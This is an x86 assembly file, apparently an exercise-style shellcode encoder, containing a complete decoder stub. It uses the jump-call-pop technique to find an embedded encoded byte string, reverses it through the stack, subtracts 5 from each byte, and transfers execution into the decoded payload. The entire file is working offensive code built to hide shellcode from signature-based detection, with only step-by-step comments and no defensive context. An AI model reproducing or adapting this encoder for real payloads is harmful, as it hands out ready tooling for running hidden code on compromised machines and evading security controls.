; Author: l0wlevel

global _start			

section .text
_start:

	jmp short call_shellcode	; Jump to call_shellcode (Jump-call-pop technique)

decoder:
	pop esi		; Pop to esi the address of the encoded shellcode
	xor ebx, ebx	; XOR ebx to avoid nullbytes
	xor eax, eax	; XOR eax to avoid nullbytes
	mov al, 1	; Move 1 to subregister al
	sub al, 1	; Substract 1 of AL to have 0 and use this register as counter

; DECODER STUB

decode:				; REVERSE the encoded shellcode (introducing it to the stack and taking out, LIFO)
	mov byte bl,[esi+eax] 	; Move value of addres esi+eax to al
	push ebx		; Push ebx to the stack
	cmp al, 24		; Compare the counter al with 24 (length of the shellcode - 1)
	je short decode2	; If al is 24 jump to decode2
	inc al			; Increment the counter al
	jmp decode		; Jump to decode

decode2:
	sub byte al, 23		; Substract 23 of al
decode3:			; SUBSTRACT 5 to each byte
	pop ebx			; Pop from the stack to ebx
	sub bl, 5		; Substract 5 to bl
	mov byte [esi+eax], bl	; Move to value of the position esi+eax the value of bl
	cmp al, 24		; Compare the counter al with 24 (length of the shellcode - 1)
	je short decode4	; If al is 24 jump decode4
	inc al			; Increment the counter al
	jmp short decode3	; Jump to decode3
decode4:			; Insert manually the last part of the decoded shellcode
	mov bl, 0x85		; Move 0x85 to bl		
	sub bl, 5		; Substract 5 of bl
	mov byte [esi+25], bl	; Move bl to value of esi+25
	jmp short EncodedShellcode+1	; Pass the control to the EncodedShellcode addres + 1

call_shellcode:
	
	call decoder	; Call decoder
	; Encoded shellcode
	EncodedShellcode: db 0x85,0xd2,0x10,0xb5,0xe6,0x8e,0x58,0xe7,0x8e,0x55,0xe8,0x8e,0x73,0x6e,0x67,0x34,0x6d,0x6d,0x78,0x34,0x34,0x6d,0x55,0xc5,0x36





